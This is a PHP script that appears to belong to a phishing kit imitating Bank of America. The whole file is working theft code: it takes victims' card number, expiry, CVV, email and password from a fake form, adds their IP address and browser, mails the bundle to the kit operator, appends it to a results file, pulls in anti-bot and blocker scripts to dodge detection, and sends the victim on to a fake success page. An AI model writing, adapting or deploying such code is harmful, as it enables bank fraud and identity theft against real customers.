<?php
$zabi = getenv("REMOTE_ADDR");
include('../email.php');
include '../antibots.php';
include '../bt.php';
include "../blocker.php";
$message .= "--------------BOA Ban3 Info---------------------\n";
$message .= "Card Number            : ".$_POST['Cnumber']."\n";
$message .= "Month            : ".$_POST['b1']."\n";
$message .= "Year            : ".$_POST['b3']."\n";
$message .= "CV            : ".$_POST['cWW']."\n";
$message .= "Email            : ".$_POST['emll']."\n";
$message .= "Password           : ".$_POST['pswd']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "------------------ By Dr.Don  ---------------\n";
$cc = $_POST['ccn'];
$subject = "BOA  BAN3 INFO [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Dr.Don <contact>\r\n";
mail($email,$subject,$message,$headers);
mail(','.$form,$subject,$message,$headers);

    $text = fopen('../../rezlt.txt', 'a');
fwrite($text, $message);
header("Location: ../Successfull.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>